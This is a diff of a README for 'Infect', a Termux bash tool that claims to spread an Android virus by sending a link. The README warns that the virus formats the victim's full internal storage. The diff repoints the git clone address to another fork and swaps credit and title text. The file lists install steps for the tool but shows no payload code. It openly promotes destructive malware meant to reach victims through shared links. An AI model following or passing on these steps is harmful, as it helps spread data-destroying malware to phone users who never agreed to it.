@@ -26,14 +26,14 @@
 
 Infect is a bash based script which is officially made for termux users and from this tool you can spread android virus by just sending link. This tool works on both rooted Android device and Non-rooted Android device.
 Warning 🚦 This Virus Formates (Deletes) Full Internal Storage So think and Use.
-<p align="center"><a href="https://rebrand.ly/noobhacktube"><img title="Noob Hackers" src="https://user-images.githubusercontent.com/49580304/117566254-31801e00-b0d3-11eb-860d-5601b1adccb8.jpg"></a>
+<p align="center"><a href="https://rebrand.ly/noobhacktube"><img title="Public Nuisance" src="https://user-images.githubusercontent.com/49580304/117566254-31801e00-b0d3-11eb-860d-5601b1adccb8.jpg"></a>
 </p>
 
 ## AVAILABLE ON :
 
 * Termux
 
-### TESTED ON :
+### Lloyd TESTED ON :
 
 * Termux
 
@@ -57,7 +57,7 @@ Warning 🚦 This Virus Formates (Deletes) Full Internal Storage So think and Us
 * `pkg install python2 -y`
 * `pkg install git -y`
 * `pip install lolcat`
-* `git clone https://github.com/noob-hackers/infect`
+* `git clone https://github.com/lloyd4565/infect`
 * `cd $HOME`
 * `ls`
 * `cd infect`
@@ -109,7 +109,7 @@ __EXIT__ :
 ## BUY ME A COFFEE :
 
 <p align="center">
-<a href="https://rebrand.ly/BuyCoffee"><img title="Noob Hackers" src="https://camo.githubusercontent.com/ae8af018f80649f3d379eb23dbf59acceaffa24e/68747470733a2f2f6c69626572617061792e636f6d2f6173736574732f776964676574732f646f6e6174652e737667"></a>
+<a href="https://rebrand.ly/BuyCoffee"><img title="Public Nuisance" src="https://camo.githubusercontent.com/ae8af018f80649f3d379eb23dbf59acceaffa24e/68747470733a2f2f6c69626572617061792e636f6d2f6173736574732f776964676574732f646f6e6174652e737667"></a>
 </p>
 
 ## WARNING : 
